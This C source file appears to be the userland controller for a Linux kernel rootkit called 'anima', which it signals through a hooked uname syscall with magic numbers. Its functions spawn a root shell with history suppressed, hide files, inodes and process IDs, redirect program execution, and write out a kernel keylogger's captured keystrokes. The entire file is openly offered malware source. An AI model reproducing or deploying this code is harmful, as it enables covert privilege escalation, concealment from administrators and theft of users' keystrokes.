#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>
#include <unistd.h>
#include <sys/stat.h>

#include <anima/anima_ctl.h>
#include "anima_api.h"

long anima_control(long mode, struct rk_args *args)
{
	struct rk_args default_args;

	if (!args)
		args = &default_args;

	args->magic_number_1 = MAGIC_NUMBER_1;
	args->magic_number_2 = MAGIC_NUMBER_2;
	args->mode = mode;

	return syscall(SYS_uname, args);
}

void root_shell(void)
{
	char *argv[] = { "/bin/sh", NULL };
	char *env[] = { "BASH_HISTORY=/dev/null", "HISTORY=/dev/null",
			"history=/dev/null" };

	anima_control(GET_ROOT, NULL);
	execve(argv[0], argv, env);
}

static long get_inode(const char *path)
{
	struct stat st;

	if (stat(path, &st) < 0)
		return -1;

	return st.st_ino;
}

void hide_inode(long ino)
{
	struct rk_args args;

	args.param1 = ino;
	anima_control(SYSCALL_HIDE_INODE, &args);
}

void unhide_inode(long ino)
{
	struct rk_args args;

	args.param1 = ino;
	anima_control(SYSCALL_UNHIDE_INODE, &args);
}

void hide_file(const char *path)
{
	long ino;

	ino = get_inode(path);
	if (ino < 0) {
		warn("unable to hide file %s", path);
		return;
	}

	hide_inode(ino);
}

void unhide_file(const char *path)
{
	long ino;

	ino = get_inode(path);
	if (ino < 0) {
		warn("unable to unhide file");
		return;
	}

	unhide_inode(ino);
}

void hide_pid(pid_t pid)
{
	struct rk_args args;
	char proc_path[64];

	args.param1 = atoi(optarg);
	anima_control(SYSCALL_HIDE_PID, &args);

	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
	hide_file(proc_path);
	snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
	hide_file(proc_path);

}

void unhide_pid(pid_t pid)
{
	struct rk_args args;
	char proc_path[64];

	args.param1 = atoi(optarg);
	anima_control(SYSCALL_UNHIDE_PID, &args);

	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
	unhide_file(proc_path);
	snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
	unhide_file(proc_path);
}

void hide_filename(const char *name)
{
	struct rk_args args;

	args.p_param1 = (void *)name;
	args.param2 = strlen(name);
	anima_control(VFS_HIDE_FILE, &args);
}

void unhide_filename(const char *name)
{
	struct rk_args args;

	args.p_param1 = (void *)name;
	args.param2 = strlen(name);
	anima_control(VFS_UNHIDE_FILE, &args);
}

void redirect_execve(char *path)
{
	struct rk_args args;
	char *old_path, *new_path;

	old_path = path;
	new_path = strchr(path, ':');
	if (!new_path)
		return;
	*new_path = 0;
	new_path++;

	args.p_param1 = old_path;
	args.param2 = strlen(old_path);
	args.p_param3 = new_path;
	args.param4 = strlen(new_path);
	anima_control(SYSCALL_REDIRECT_EXECVE, &args);
}

void unredirect_execve(char *path)
{
	struct rk_args args;

	args.p_param1 = path;
	args.param2 = strlen(path);
	anima_control(SYSCALL_UNREDIRECT_EXECVE, &args);
}

void get_keylogger_buf(const char *path)
{
	struct rk_args args;
	char keylogger_buf[1024];
	FILE *fp;

	memset(keylogger_buf, 0, sizeof(keylogger_buf));

	fp = fopen(path, "a+");
	if (!fp) {
		ferror(fp);
		return;
	}

	args.p_param1 = (char *)keylogger_buf;
	args.param2 = sizeof(keylogger_buf);
	anima_control(SYSCALL_GET_KEYLOGGER_BUF, &args);


	fwrite(keylogger_buf, 1, sizeof(keylogger_buf), fp);
	fclose(fp);
}


